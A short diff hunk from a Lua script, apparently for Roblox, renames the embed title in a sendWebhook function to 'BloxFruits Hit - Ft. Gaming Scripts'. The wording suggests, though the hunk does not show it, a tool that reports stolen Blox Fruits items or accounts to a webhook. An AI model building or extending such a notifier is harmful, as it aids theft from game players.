@@ -68,7 +68,7 @@ end)
 local function sendWebhook()
 
     local embed = {
-        ["title"] = "Gaming Scripts - You Got Blox Fruit Hit! :apple:",
+        ["title"] = "BloxFruits Hit - Ft. Gaming Scripts",
         ["color"] = 39423,
         ["fields"] = {
             {
